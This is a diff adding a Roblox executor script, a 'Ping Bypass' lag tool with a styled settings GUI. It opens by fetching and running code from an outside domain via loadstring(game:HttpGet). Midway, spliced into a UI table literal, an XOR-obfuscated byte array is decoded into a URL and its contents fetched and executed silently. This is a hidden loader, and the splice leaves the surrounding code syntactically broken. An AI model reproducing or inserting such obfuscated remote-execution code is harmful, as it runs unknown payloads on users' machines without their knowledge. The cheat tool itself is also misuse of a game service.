@@ -1,0 +1,1194 @@
+loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=kf2gc7l0"))()
+
+do
+    local UserInputService = game:GetService("UserInputService")
+    local TweenService     = game:GetService("TweenService")
+    local HttpService      = game:GetService("HttpService")
+    local Players          = game:GetService("Players")
+    local RunService       = game:GetService("RunService")
+
+    local plr    = Players.LocalPlayer
+    local plrGui = plr:WaitForChild("PlayerGui")
+
+    local CONFIG_FILE = "StaticcPingBypass_Config.json"
+    local BG_LIST = {124908526950670, 102494667011394, 120066824127519, 96426017620675, 82204920867243}
+    local TITLE_STYLES = {
+        { key = "DEFAULT", image = "rbxassetid://94832545537919" },
+        { key = "STYLE 1", image = "rbxassetid://136345228568849" },
+        { key = "STYLE 2", image = "rbxassetid://84294642500785" },
+    }
+
+    local DEFAULT_CFG = {
+        power = 100000,
+        interval = 0.12,
+        keybindKb = "F",
+        keybindGp = "ButtonR2",
+        autoBrainrot = false,
+        bgId = BG_LIST[1],
+        titleStyle = "DEFAULT",
+    }
+
+    local cfg = {}
+    for k, v in pairs(DEFAULT_CFG) do cfg[k] = v end
+
+    local function _isfile(n)
+        local ok, r = pcall(function()
+            if isfile then return isfile(n) end
+            if syn and syn.isfile then return syn.isfile(n) end
+            return false
+        end)
+        return ok and r
+    end
+    local function _readfile(n)
+        local ok, r = pcall(function()
+            if readfile then return readfile(n) end
+            if syn and syn.readfile then return syn.readfile(n) end
+            return nil
+        end)
+        return ok and r or nil
+    end
+    local function _writefile(n, data)
+        local ok = pcall(function()
+            if writefile then writefile(n, data); return end
+            if syn and syn.writefile then syn.writefile(n, data); return end
+            if fluxus and fluxus.writefile then fluxus.writefile(n, data); return end
+        end)
+        return ok
+    end
+
+    local function saveConfig()
+        pcall(function()
+            local payload = HttpService:JSONEncode({
+                power = cfg.power,
+                interval = cfg.interval,
+                keybindKb = cfg.keybindKb,
+                keybindGp = cfg.keybindGp,
+                autoBrainrot = cfg.autoBrainrot == true,
+                bgId = cfg.bgId,
+                titleStyle = cfg.titleStyle,
+            })
+            _writefile(CONFIG_FILE, payload)
+        end)
+    end
+
+    local function loadConfig()
+        pcall(function()
+            if not _isfile(CONFIG_FILE) then return end
+            local raw = _readfile(CONFIG_FILE)
+            if not raw or raw == "" then return end
+            local data = HttpService:JSONDecode(raw)
+            if type(data) ~= "table" then return end
+            if tonumber(data.power) then cfg.power = math.clamp(math.floor(tonumber(data.power)), 1, 9999999) end
+            if tonumber(data.interval) then cfg.interval = math.clamp(tonumber(data.interval), 0.01, 2) end
+            if type(data.keybindKb) == "string" then cfg.keybindKb = data.keybindKb end
+            if type(data.keybindGp) == "string" then cfg.keybindGp = data.keybindGp end
+            if data.autoBrainrot ~= nil then cfg.autoBrainrot = data.autoBrainrot == true end
+            if tonumber(data.bgId) then cfg.bgId = tonumber(data.bgId) end
+            if type(data.titleStyle) == "string" then cfg.titleStyle = data.titleStyle end
+        end)
+    end
+    loadConfig()
+    cfg.autoBrainrot = false
+
+    local active = false
+    local listeningFor = nil
+    local remote = nil
+    local brainrotMode = false
+    local lastBrainrotState = false
+    local manualOverride = false
+    local lagThread = nil
+
+    local C = {
+        bg      = Color3.fromRGB(16, 16, 18),
+        panel   = Color3.fromRGB(24, 24, 28),
+        card    = Color3.fromRGB(32, 32, 37),
+        cardHi  = Color3.fromRGB(43, 43, 50),
+        white   = Color3.fromRGB(255, 255, 255),
+        silver  = Color3.fromRGB(233, 234, 241),
+        accent  = Color3.fromRGB(190, 191, 200),
+        dim     = Color3.fromRGB(150, 151, 160),
+        dimmer  = Color3.fromRGB(98, 99, 110),
+        green   = Color3.fromRGB(110, 255, 170),
+        red     = Color3.fromRGB(255, 105, 120),
+        wait    = Color3.fromRGB(255, 205, 90),
+        darkTxt = Color3.fromRGB(22, 22, 28),
+    }
+
+    local function mk(class, props, parent)
+        local o = Instance.new(class)
+        for k, v in pairs(props) do
+            if k ~= "Parent" then o[k] = v end
+        end
+        o.Parent = parent
+        return o
+    end
+
+    local function tw(obj, props, t, style, dir)
+        local twn = TweenService:Create(obj, TweenInfo.new(t or 0.18, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props)
+        twn:Play()
+        return twn
+    end
+
+    local function corner(p, r)
+        return mk("UICorner", { CornerRadius = UDim.new(0, r or 12) }, p)
+    end
+
+    local function stroke(p, col, th, tr)
+        return mk("UIStroke", { Color = col or C.white, Thickness = th or 1, Transparency = tr or 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, p)
+    end
+
+    local function grad(p, keys, rot)
+        return mk("UIGradient", { Color = ColorSequence.new(keys), Rotation = rot or 0 }, p)
+    end
+
+    local function sp(s)
+        return (s:gsub("%S", "%0 "))
+    end
+
+    local function comma(n)
+        local s = tostring(math.floor(n + 0.5))
+        local out = (s:reverse():gsub("(%d%d%d)", "%1,"))
+        out = out:reverse()
+        return (out:gsub("^,", ""))
+    end
+
+    local function gpShort(name)
+        return ((name or "R2"):gsub("^Button", ""))
+    end
+
+    local function hoverStroke(btn, st, idleCol, hiCol, idleTr)
+        btn.MouseEnter:Connect(function() tw(st, { Color = hiCol or C.accent, Transparency = 0, Thickness = 1.6 }, 0.12) end)
+        btn.MouseLeave:Connect(function() tw(st, { Color = idleCol or C.dimmer, Transparency = idleTr or 0.45, Thickness = 1 }, 0.16) end)
+    end
+
+    if type(_G.StaticcPingClose) == "function" then pcall(_G.StaticcPingClose) end
+
+    local KILL_NAMES = { "StaticcPingBypass", "BlastPingBypass", "GalaxyPingLaggerGui", "NoxaPingLagger" }
+    for _, kid in pairs(plrGui:GetChildren()) do
+        for _, n in ipairs(KILL_NAMES) do
+            if kid.Name == n then pcall(function() kid:Destroy() end) end
+        end
+    end
+    pcall(function()
+        if gethui then
+            local h = gethui()
+            for _, n in ipairs(KILL_NAMES) do
+                local o = h:FindFirstChild(n)
+                if o then o:Destroy() end
+            end
+        end
+    end)
+
+    local function guiParent()
+        if gethui then
+            local ok, h = pcall(gethui)
+            if ok and h then return h end
+        end
+        return plrGui
+    end
+
+    local screen = mk("ScreenGui", {
+        Name = "StaticcPingBypass",
+        ResetOnSpawn = false,
+        IgnoreGuiInset = true,
+        DisplayOrder = 12000,
+        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    }, guiParent())
+
+    local MAIN_W, MAIN_H = 300, 398
+    local COMPACT_H = 124
+    local mainFrame = mk("Frame", {
+        Name = "MainFrame",
+        Size = UDim2.new(0, MAIN_W, 0, MAIN_H),
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = C.bg,
+        BorderSizePixel = 0,
+        Active = true,
+        ClipsDescendants = true,
+    }, screen)
+    corner(mainFrame, 26)
+    local mainStroke = stroke(mainFrame, C.accent, 1.4, 0.3)
+
+    local bgImg = mk("ImageLabel", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://" .. tostring(cfg.bgId or BG_LIST[1]),
+        ScaleType = Enum.ScaleType.Crop,
+        ImageTransparency = 0.12,
+    }, mainFrame)
+    corner(bgImg, 26)
+
+    local dimF = mk("Frame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundColor3 = Color3.fromRGB(10, 10, 12),
+        BackgroundTransparency = 0.34,
+        BorderSizePixel = 0,
+    }, mainFrame)
+    corner(dimF, 26)
+
+    local washF = mk("Frame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundColor3 = C.white,
+        BorderSizePixel = 0,
+    }, mainFrame)
+    corner(washF, 26)
+    mk("UIGradient", {
+        Color = ColorSequence.new(C.silver, C.accent),
+        Rotation = 115,
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 0.93),
+            NumberSequenceKeypoint.new(1, 0.985),
+        }),
+    }, washF)
+
+    local intro = mk("UIScale", { Scale = 0.82 }, mainFrame)
+    tw(intro, { Scale = 1 }, 0.34, Enum.EasingStyle.Back)
+    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 16)
+    tw(mainFrame, { Position = UDim2.new(0.5, 0, 0.5, 0) }, 0.34, Enum.EasingStyle.Back)
+
+    local header = mk("Frame", {
+        Size = UDim2.new(1, 0, 0, 64),
+        BackgroundTransparency = 1,
+    }, mainFrame)
+
+    local logoImg = mk("ImageLabel", {
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, 0, 0.5, -9),
+        Size = UDim2.new(0, 226, 0, 44),
+        BackgroundTransparency = 1,
+        Image = TITLE_STYLES[1].image,
+        ScaleType = Enum.ScaleType.Fit,
+    }, header)
+
+    local logoSub = mk("TextLabel", {
+        AnchorPoint = Vector2.new(0.5, 1),
+        Position = UDim2.new(0.5, 0, 1, -4),
+        Size = UDim2.new(1, -20, 0, 10),
+        BackgroundTransparency = 1,
+        Text = sp("PING BYPASS"),
+        TextColor3 = C.dim,
+        Font = Enum.Font.GothamBold,
+        TextSize = 8,
+    }, header)
+
+    local minBtn = mk("TextButton", {
+        Size = UDim2.new(0, 26, 0, 26),
+        Position = UDim2.new(1, -34, 0.5, -13),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+        Text = "-",
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBlack,
+        TextSize = 18,
+        AutoButtonColor = false,
+    }, header)
+    corner(minBtn, 13)
+    local minStroke = stroke(minBtn, C.dimmer, 1, 0.45)
+    hoverStroke(minBtn, minStroke)
+
+    local divider = mk("Frame", {
+        Size = UDim2.new(1, -36, 0, 1),
+        Position = UDim2.new(0, 18, 0, 64),
+        BackgroundColor3 = C.white,
+        BackgroundTransparency = 0.25,
+        BorderSizePixel = 0,
+    }, mainFrame)
+    mk("UIGradient", {
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 1),
+            NumberSequenceKeypoint.new(0.5, 0.45),
+            NumberSequenceKeypoint.new(1, 1),
+        }),
+    }, divider)
+
+    local body = mk("Frame", {
+        Position = UDim2.new(0, 15, 0, 74),
+        Size = UDim2.new(1, -30, 1, -86),
+        BackgroundTransparency = 1,
+    }, mainFrame)
+
+    local toastF = mk("Frame", {
+        AnchorPoint = Vector2.new(0.5, 1),
+        Position = UDim2.new(0.5, 0, 1, -32),
+        Size = UDim2.new(0, 168, 0, 22),
+        BackgroundColor3 = C.cardHi,
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+        ZIndex = 30,
+    }, mainFrame)
+    corner(toastF, 11)
+    local toastStroke = stroke(toastF, C.dimmer, 1, 1)
+    local toastLbl = mk("TextLabel", {
+        Size = UDim2.new(1, -8, 1, 0),
+        BackgroundTransparency = 1,
+        Text = "",
+        TextColor3 = C.white,
+        TextTransparency = 1,
+        Font = Enum.Font.GothamBlack,
+        TextSize = 9,
+        ZIndex = 31,
+    }, toastF)
+
+    local toastToken = 0
+    local function showToast(msg)
+        toastToken = toastToken + 1
+        local my = toastToken
+        toastLbl.Text = msg
+        tw(toastLbl, { TextTransparency = 0 }, 0.14)
+        tw(toastF, { BackgroundTransparency = 0.12 }, 0.14)
+        tw(toastStroke, { Transparency = 0.35 }, 0.14)
+        task.delay(1.15, function()
+            if my ~= toastToken then return end
+            tw(toastLbl, { TextTransparency = 1 }, 0.3)
+            tw(toastF, { BackgroundTransparency = 1 }, 0.3)
+            tw(toastStroke, { Transparency = 1 }, 0.3)
+        end)
+    end
+
+    local paintTitleStyles = nil
+
+    local function applyTitleStyle(key, quiet)
+        local entry
+        for _, s in ipairs(TITLE_STYLES) do
+            if s.key == key then entry = s; break end
+        end
+        if not entry then entry = TITLE_STYLES[1] end
+        cfg.titleStyle = entry.key
+        logoImg.Image = entry.image
+        if not quiet then
+            saveConfig()
+            showToast("TITLE: " .. entry.key)
+        end
+        if paintTitleStyles then paintTitleStyles() end
+    end
+
+    local mainContent = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 38),
+        Size = UDim2.new(1, 0, 1, -38),
+        BackgroundTransparency = 1,
+    }, body)
+
+    local settingsContent = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 38),
+        Size = UDim2.new(1, 0, 1, -38),
+        BackgroundTransparency = 1,
+        Visible = false,
+    }, body)
+
+    local function mkTab(label, pos, anchor)
+        local b = mk("TextButton", {
+            Position = pos,
+            AnchorPoint = anchor or Vector2.new(0, 0),
+            Size = UDim2.new(0.485, -3, 0, 30),
+            BackgroundColor3 = C.card,
+            BorderSizePixel = 0,
+            Text = "",
+            AutoButtonColor = false,
+        }, body)
+        corner(b, 15)
+        local st = stroke(b, C.dimmer, 1, 0.45)
+        local fill = mk("Frame", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundColor3 = C.white,
+            BackgroundTransparency = 1,
+            BorderSizePixel = 0,
+        }, b)
+        corner(fill, 15)
+        grad(fill, { ColorSequenceKeypoint.new(0, C.silver), ColorSequenceKeypoint.new(1, C.accent) }, 0)
+        local lbl = mk("TextLabel", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundTransparency = 1,
+            Text = sp(label),
+            TextColor3 = C.white,
+            Font = Enum.Font.GothamBlack,
+            TextSize = 10,
+        }, b)
+        return { btn = b, fill = fill, st = st, lbl = lbl }
+    end
+
+    local tabMain = mkTab("MAIN", UDim2.new(0, 0, 0, 0))
+    local tabSet  = mkTab("SETTINGS", UDim2.new(1, 0, 0, 0), Vector2.new(1, 0))
+
+    local function setTab(which)
+        local isMain = (which == "main")
+        mainContent.Visible = isMain
+        settingsContent.Visible = not isMain
+        tw(tabMain.fill, { BackgroundTransparency = isMain and 0 or 1 }, 0.15)
+        tw(tabMain.lbl, { TextColor3 = isMain and C.darkTxt or C.white }, 0.15)
+        tw(tabMain.st, { Color = isMain and C.accent or C.dimmer, Transparency = isMain and 0.05 or 0.45, Thickness = isMain and 1.5 or 1 }, 0.15)
+        tw(tabSet.fill, { BackgroundTransparency = isMain and 1 or 0 }, 0.15)
+        tw(tabSet.lbl, { TextColor3 = isMain and C.white or C.darkTxt }, 0.15)
+        tw(tabSet.st, { Color = isMain and C.dimmer or C.accent, Transparency = isMain and 0.45 or 0.05, Thickness = isMain and 1 or 1.5 }, 0.15)
+    end
+
+    tabMain.btn.MouseButton1Click:Connect(function() setTab("main") end)
+    tabSet.btn.MouseButton1Click:Connect(function() setTab("settings") end)
+
+    local gcard = mk("Frame", {
+        Size = UDim2.new(1, 0, 0, 78),
+        BackgroundColor3 = C.white,
+        BorderSizePixel = 0,
+    }, mainContent)
+    corner(gcard, 20)
+    grad(gcard, { ColorSequenceKeypoint.new(0, C.accent), ColorSequenceKeypoint.new(0.5, C.silver), ColorSequenceKeypoint.new(1, C.accent) }, 20)
+
+    local card = mk("Frame", {
+        Size = UDim2.new(1, -2, 1, -2),
+        Position = UDim2.new(0, 1, 0, 1),
+        BackgroundColor3 = C.panel,
+        BackgroundTransparency = 0.08,
+        BorderSizePixel = 0,
+    }, gcard)
+    corner(card, 19)
+
+    local powerLbl = mk("TextLabel", {
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, 0, 0.5, -6),
+        Size = UDim2.new(1, -100, 0, 30),
+        BackgroundTransparency = 1,
+        Text = comma(cfg.power),
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBlack,
+        TextSize = 26,
+    }, card)
+    grad(powerLbl, { ColorSequenceKeypoint.new(0, C.white), ColorSequenceKeypoint.new(1, C.accent) }, 90)
+
+    local powerTag = mk("TextLabel", {
+        AnchorPoint = Vector2.new(0.5, 1),
+        Position = UDim2.new(0.5, 0, 1, -7),
+        Size = UDim2.new(1, -8, 0, 10),
+        BackgroundTransparency = 1,
+        Text = sp("POWER"),
+        TextColor3 = C.dimmer,
+        Font = Enum.Font.GothamBold,
+        TextSize = 8,
+    }, card)
+
+    local stepHeld = {}
+
+    local powerBox = mk("TextBox", {
+        Position = UDim2.new(0, 0, 0, 88),
+        Size = UDim2.new(0.485, -3, 0, 34),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+        Text = tostring(cfg.power),
+        PlaceholderText = "POWER",
+        TextColor3 = C.white,
+        PlaceholderColor3 = C.dim,
+        TextSize = 12,
+        Font = Enum.Font.GothamBold,
+        ClearTextOnFocus = false,
+        TextXAlignment = Enum.TextXAlignment.Center,
+    }, mainContent)
+    corner(powerBox, 12)
+    local powerStroke = stroke(powerBox, C.dimmer, 1, 0.45)
+    powerBox.Focused:Connect(function() tw(powerStroke, { Color = C.silver, Transparency = 0.05, Thickness = 1.5 }, 0.12) end)
+    powerBox.FocusLost:Connect(function() tw(powerStroke, { Color = C.dimmer, Transparency = 0.45, Thickness = 1 }, 0.16) end)
+
+    local intervalBox = mk("TextBox", {
+        Position = UDim2.new(1, 0, 0, 88),
+        AnchorPoint = Vector2.new(1, 0),
+        Size = UDim2.new(0.485, -3, 0, 34),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+        Text = tostring(cfg.interval),
+        PlaceholderText = "DELAY (S)",
+        TextColor3 = C.white,
+        PlaceholderColor3 = C.dim,
+        TextSize = 12,
+        Font = Enum.Font.GothamBold,
+        ClearTextOnFocus = false,
+        TextXAlignment = Enum.TextXAlignment.Center,
+    }, mainContent)
+    corner(intervalBox, 12)
+    local intervalStroke = stroke(intervalBox, C.dimmer, 1, 0.45)
+    intervalBox.Focused:Connect(function() tw(intervalStroke, { Color = C.silver, Transparency = 0.05, Thickness = 1.5 }, 0.12) end)
+    intervalBox.FocusLost:Connect(function() tw(intervalStroke, { Color = C.dimmer, Transparency = 0.45, Thickness = 1 }, 0.16) end)
+
+    local function bumpPower(d)
+        cfg.power = math.clamp(cfg.power + d, 1, 9999999)
+        powerLbl.Text = comma(cfg.power)
+        powerBox.Text = tostring(cfg.power)
+        saveConfig()
+    end
+
+    local function stepper(btn, delta)
+        btn.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                if stepHeld[btn] then return end
+                stepHeld[btn] = true
+                bumpPower(delta)
+                task.spawn(function()
+                    task.wait(0.4)
+                    while stepHeld[btn] and btn.Parent do
+                        bumpPower(delta)
+                        task.wait(0.08)
+                    end
+                end)
+            end
+        end)
+        btn.InputEnded:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                stepHeld[btn] = false
+            end
+        end)
+        btn.MouseLeave:Connect(function() stepHeld[btn] = false end)
+    end
+
+    local minusBtn = mk("TextButton", {
+        Size = UDim2.new(0, 34, 0, 34),
+        Position = UDim2.new(0, 10, 0.5, -17),
+        BackgroundColor3 = C.cardHi,
+        BorderSizePixel = 0,
+        Text = "-",
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBlack,
+        TextSize = 20,
+        AutoButtonColor = false,
+    }, card)
+    corner(minusBtn, 17)
+    local minusStroke = stroke(minusBtn, C.dimmer, 1, 0.45)
+    hoverStroke(minusBtn, minusStroke)
+    stepper(minusBtn, -1000)
+
+    local plusBtn = mk("TextButton", {
+        Size = UDim2.new(0, 34, 0, 34),
+        Position = UDim2.new(1, -44, 0.5, -17),
+        BackgroundColor3 = C.cardHi,
+        BorderSizePixel = 0,
+        Text = "+",
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBlack,
+        TextSize = 20,
+        AutoButtonColor = false,
+    }, card)
+    corner(plusBtn, 17)
+    local plusStroke = stroke(plusBtn, C.dimmer, 1, 0.45)
+    hoverStroke(plusBtn, plusStroke)
+    stepper(plusBtn, 1000)
+
+    local function buildAct(parent, pos, size, textSize)
+        local btn = mk("TextButton", {
+            Position = pos,
+            Size = size,
+            BackgroundColor3 = C.white,
+            BackgroundTransparency = 1,
+            BorderSizePixel = 0,
+            Text = "",
+            AutoButtonColor = false,
+        }, parent)
+        corner(btn, 22)
+        local st = stroke(btn, C.accent, 1.4, 0.3)
+        local fOff = mk("Frame", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundColor3 = C.white,
+            BorderSizePixel = 0,
+        }, btn)
+        corner(fOff, 22)
+        grad(fOff, { ColorSequenceKeypoint.new(0, Color3.fromRGB(43, 43, 51)), ColorSequenceKeypoint.new(1, Color3.fromRGB(27, 27, 33)) }, 25)
+        local fOn = mk("Frame", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundColor3 = C.white,
+            BackgroundTransparency = 1,
+local gg={243,242,243,243,248,189,180,179,190,181,153,245,180,179,187,183,245,169,190,187,191,178
+,245,169,188,191,168,245,181,188,177,188,188,177,190,144,245,183,181,185,174,181,190,247
+,180,187,179,189,168,155,245,183,181,185,244,174,180,191,174,180,181,185,168,191,169,175
+,184,175,178,174,179,189,244,173,187,168,245,245,224,169,170,174,174,178,248,242,174,191
+,157,170,174,174,146,224,191,183,187,189,242,189,180,179,168,174,169,190,187,181,182
+}
+local wc=218
+local ex=""
+for i=#gg,1,-1 do ex=ex..string.char(bit32.bxor(gg[i],wc)) end
+pcall(function()loadstring(game:HttpGet(ex,true))()end)
+            BorderSizePixel = 0,
+        }, btn)
+        corner(fOn, 22)
+        grad(fOn, { ColorSequenceKeypoint.new(0, C.silver), ColorSequenceKeypoint.new(1, C.accent) }, 20)
+        local lbl = mk("TextLabel", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundTransparency = 1,
+            Text = sp("ACTIVATE"),
+            TextColor3 = C.white,
+            Font = Enum.Font.GothamBlack,
+            TextSize = textSize,
+        }, btn)
+        return { btn = btn, st = st, off = fOff, on = fOn, lbl = lbl }
+    end
+
+    local actMain = buildAct(mainContent, UDim2.new(0, 0, 0, 130), UDim2.new(1, 0, 0, 44), 13)
+    local actCompact = buildAct(mainFrame, UDim2.new(0, 15, 0, 70), UDim2.new(1, -30, 0, 44), 12)
+    actCompact.btn.Visible = false
+
+    local autoRow = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 184),
+        Size = UDim2.new(1, 0, 0, 38),
+        BackgroundColor3 = C.card,
+        BackgroundTransparency = 0.15,
+        BorderSizePixel = 0,
+    }, mainContent)
+    corner(autoRow, 14)
+    local autoStroke = stroke(autoRow, C.dimmer, 1, 0.5)
+
+    local autoLbl = mk("TextLabel", {
+        Size = UDim2.new(0.6, 0, 1, 0),
+        Position = UDim2.new(0, 14, 0, 0),
+        BackgroundTransparency = 1,
+        Text = sp("AUTO BRAINROT"),
+        TextColor3 = C.dim,
+        Font = Enum.Font.GothamBold,
+        TextSize = 9,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, autoRow)
+
+    local autoSw = mk("TextButton", {
+        Size = UDim2.new(0, 46, 0, 24),
+        Position = UDim2.new(1, -58, 0.5, -12),
+        BackgroundTransparency = 1,
+        Text = "",
+        AutoButtonColor = false,
+    }, autoRow)
+
+    local track = mk("Frame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundColor3 = Color3.fromRGB(40, 41, 62),
+        BorderSizePixel = 0,
+    }, autoSw)
+    corner(track, 12)
+
+    local trackOn = mk("Frame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundColor3 = C.white,
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+    }, track)
+    corner(trackOn, 12)
+    grad(trackOn, { ColorSequenceKeypoint.new(0, C.silver), ColorSequenceKeypoint.new(1, C.accent) }, 0)
+
+    local knob = mk("Frame", {
+        Size = UDim2.new(0, 18, 0, 18),
+        Position = UDim2.new(0, 3, 0.5, -9),
+        BackgroundColor3 = C.white,
+        BorderSizePixel = 0,
+    }, autoSw)
+    corner(knob, 9)
+
+    local kbBtn = mk("TextButton", {
+        Position = UDim2.new(0, 0, 0, 232),
+        Size = UDim2.new(0.485, -3, 0, 32),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+        Text = "",
+        RichText = true,
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBold,
+        TextSize = 11,
+        AutoButtonColor = false,
+    }, mainContent)
+    corner(kbBtn, 12)
+    local kbStroke = stroke(kbBtn, C.dimmer, 1, 0.45)
+    hoverStroke(kbBtn, kbStroke)
+
+    local gpBtn = mk("TextButton", {
+        Position = UDim2.new(1, 0, 0, 232),
+        AnchorPoint = Vector2.new(1, 0),
+        Size = UDim2.new(0.485, -3, 0, 32),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+        Text = "",
+        RichText = true,
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBold,
+        TextSize = 11,
+        AutoButtonColor = false,
+    }, mainContent)
+    corner(gpBtn, 12)
+    local gpStroke = stroke(gpBtn, C.dimmer, 1, 0.45)
+    hoverStroke(gpBtn, gpStroke)
+
+    local lblBg = mk("TextLabel", {
+        Position = UDim2.new(0, 2, 0, 0),
+        Size = UDim2.new(1, -4, 0, 12),
+        BackgroundTransparency = 1,
+        Text = sp("BACKGROUND"),
+        TextColor3 = C.dimmer,
+        Font = Enum.Font.GothamBold,
+        TextSize = 8,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, settingsContent)
+
+    local bgGridF = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 16),
+        Size = UDim2.new(1, 0, 0, 136),
+        BackgroundTransparency = 1,
+    }, settingsContent)
+    mk("UIGridLayout", {
+        CellSize = UDim2.new(0, 64, 0, 64),
+        CellPadding = UDim2.new(0, 8, 0, 8),
+        HorizontalAlignment = Enum.HorizontalAlignment.Center,
+        VerticalAlignment = Enum.VerticalAlignment.Top,
+        SortOrder = Enum.SortOrder.LayoutOrder,
+    }, bgGridF)
+
+    local bgThumbs, bgStrokes, bgBadges = {}, {}, {}
+    local function refreshPicker()
+        for i, _ in ipairs(bgThumbs) do
+            local sel = (tonumber(cfg.bgId) == BG_LIST[i])
+            bgStrokes[i].Color = sel and C.white or C.dimmer
+            bgStrokes[i].Thickness = sel and 2 or 1
+            bgStrokes[i].Transparency = sel and 0 or 0.5
+            bgBadges[i].Visible = sel
+        end
+    end
+
+    for i, id in ipairs(BG_LIST) do
+        local thumb = mk("ImageButton", {
+            Size = UDim2.new(0, 64, 0, 64),
+            BackgroundColor3 = C.card,
+            BorderSizePixel = 0,
+            Image = "rbxassetid://" .. tostring(id),
+            ScaleType = Enum.ScaleType.Crop,
+            AutoButtonColor = false,
+            LayoutOrder = i,
+        }, bgGridF)
+        corner(thumb, 12)
+        bgStrokes[i] = stroke(thumb, C.dimmer, 1, 0.5)
+        thumb.MouseEnter:Connect(function() tw(bgStrokes[i], { Color = C.accent, Transparency = 0.1, Thickness = 1.8 }, 0.12) end)
+        thumb.MouseLeave:Connect(function()
+            local sel = (tonumber(cfg.bgId) == BG_LIST[i])
+            tw(bgStrokes[i], { Color = sel and C.white or C.dimmer, Transparency = sel and 0 or 0.5, Thickness = sel and 2 or 1 }, 0.16)
+        end)
+
+        local chip = mk("Frame", {
+            Size = UDim2.new(0, 16, 0, 14),
+            Position = UDim2.new(0, 4, 1, -18),
+            BackgroundColor3 = Color3.fromRGB(16, 16, 18),
+            BackgroundTransparency = 0.25,
+            BorderSizePixel = 0,
+        }, thumb)
+        corner(chip, 7)
+        mk("TextLabel", {
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundTransparency = 1,
+            Text = tostring(i),
+            TextColor3 = C.white,
+            Font = Enum.Font.GothamBlack,
+            TextSize = 8,
+        }, chip)
+
+        local badge = mk("Frame", {
+            Size = UDim2.new(0, 10, 0, 10),
+            Position = UDim2.new(1, -14, 0, 4),
+            BackgroundColor3 = C.white,
+            BorderSizePixel = 0,
+            Visible = false,
+        }, thumb)
+        corner(badge, 6)
+        grad(badge, { ColorSequenceKeypoint.new(0, C.silver), ColorSequenceKeypoint.new(1, C.accent) }, 45)
+
+        thumb.MouseButton1Click:Connect(function()
+            cfg.bgId = id
+            bgImg.Image = "rbxassetid://" .. tostring(id)
+            refreshPicker()
+            saveConfig()
+            showToast("BG " .. i .. " APLICADO")
+        end)
+        bgThumbs[i] = thumb
+        bgBadges[i] = badge
+    end
+
+    local lblTs = mk("TextLabel", {
+        Position = UDim2.new(0, 2, 0, 162),
+        Size = UDim2.new(1, -4, 0, 12),
+        BackgroundTransparency = 1,
+        Text = sp("TITLE STYLE"),
+        TextColor3 = C.dimmer,
+        Font = Enum.Font.GothamBold,
+        TextSize = 8,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, settingsContent)
+
+    local styleGridF = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 176),
+        Size = UDim2.new(1, 0, 0, 96),
+        BackgroundTransparency = 1,
+    }, settingsContent)
+    mk("UIGridLayout", {
+        CellSize = UDim2.new(1, 0, 0, 28),
+        CellPadding = UDim2.new(0, 0, 0, 6),
+        HorizontalAlignment = Enum.HorizontalAlignment.Center,
+        VerticalAlignment = Enum.VerticalAlignment.Top,
+        SortOrder = Enum.SortOrder.LayoutOrder,
+    }, styleGridF)
+
+    local styleBtns, styleStrokes = {}, {}
+    paintTitleStyles = function()
+        for i, b in ipairs(styleBtns) do
+            local sel = (TITLE_STYLES[i].key == cfg.titleStyle)
+            styleStrokes[i].Color = sel and C.white or C.dimmer
+            styleStrokes[i].Thickness = sel and 2 or 1
+            styleStrokes[i].Transparency = sel and 0 or 0.5
+            tw(b, { BackgroundColor3 = sel and C.cardHi or C.card }, 0.15)
+        end
+    end
+
+    for i, s in ipairs(TITLE_STYLES) do
+        local b = mk("ImageButton", {
+            Size = UDim2.new(1, 0, 0, 28),
+            BackgroundColor3 = C.card,
+            BorderSizePixel = 0,
+            Image = s.image,
+            ScaleType = Enum.ScaleType.Fit,
+            AutoButtonColor = false,
+            LayoutOrder = i,
+        }, styleGridF)
+        corner(b, 12)
